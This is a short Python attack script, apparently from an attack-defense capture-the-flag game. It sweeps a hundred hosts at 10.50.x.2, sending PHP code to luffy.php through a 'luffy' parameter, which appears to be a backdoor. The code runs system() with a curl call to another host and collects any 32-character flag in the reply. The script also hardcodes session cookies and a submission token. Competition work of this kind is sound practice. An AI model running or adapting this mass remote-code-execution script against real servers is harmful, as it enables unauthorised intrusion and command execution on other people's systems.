import requests


def submit(local_flag):
    cookie = 'PHPSESSID=5khjeim0nulmib7h108hul1qn0; php-console-server=5; matchToken_11=eyJpdiI6IlkwSm5VUWJEYXhOa045NFF0M2tTXC9RPT0iLCJ2YWx1ZSI6IkdZdHcxVzg0R1wvWHFPTXJvQ1M4WFB5REN1aHJkMVljQURmN3MxMlZUXC9icHZ1VHBxMDFGV2I2Z2RMeGFLcDVEVXRkVmJ5R2tPd1NYaEtwbWpyeEg0b2ZzcGl5dUQ1bnZ2OWJud3JnYm9uYWgzQXFhNHdCUDR4c3k3NHJwcGxvVEUiLCJtYWMiOiI4NjdlMDFmNTU4MmU0NGY1MWM4YWEyNDQ4MzZjMjM5YTZhN2IzYzE3YWVhOWMzOTFiZDJhZDhjOWUwMjlkMjA5In0%3D; matchToken_12=eyJpdiI6IklpTUw5VlplTktzbDlOQlBEbk45UEE9PSIsInZhbHVlIjoiczY0cEZsYnErbGhjM3R1RWpzVzJiaHdXeFBIT25iSDFJWUJKeWZobisxcElPdUlseDRVb2xSNnEwN1RveW15WnlKcVdWZjlyNjV5Z1AwMXdrdmxBTFdvdHpZTHBoUmtoZXMxRE10U2g1UjVOY05LSkU4VFd4MzVxSHgyVlI5Ym0iLCJtYWMiOiIyOGYzNGM1ZGRjOWJjNTU1OWRlNWZiNmMyZDg5ZjQzODcwNzk5NTk4MDAwNGRlZjQ3MjU1NjgyOTA0NjFjNGRjIn0%3D; adl=eyJpdiI6Inhmc1FicUc5dnA0SG1xRm9xZjRjdXc9PSIsInZhbHVlIjoic2l6NzJhTlI4RGtBOFFScFpUUXBmQW53a1pCSTM5QkkrMzArdlB3QWNaK0pkRnZ1dlwvMDBhR3JwTkJ1c3V0VTgyZ1J1QXJURGFpXC9RZFBKeFpcLzdoZUE9PSIsIm1hYyI6ImMwNjY0OGJkOTgxMDQ1YTQwZDFlZjhhZDA4ZTE0YzljY2NlY2Q0ZmU1NWExZjgyZjI5MWVhOWNjOTBmZjIyZWIifQ%3D%3D'
    r = requests.post('https://192.168.87.10/match/WAR12/api',
                      data=f'atn=answers&id=8&token=fszQNPdBjrbKsjJ4V5Mo_12&flag={local_flag}')
    print(r.text)


for i in range(100):
    try:
        print(i)
        url = 'http://10.50.{}.2/luffy.php'.format(i)
        s = requests.session()
        r = s.post(url, data={'luffy': 'system("curl http://10.0.1.2?token=EVVSJBVY");'}, timeout=2)
        flag = r.text
        if len(flag) == 32:
            print(flag)
    except:
        pass
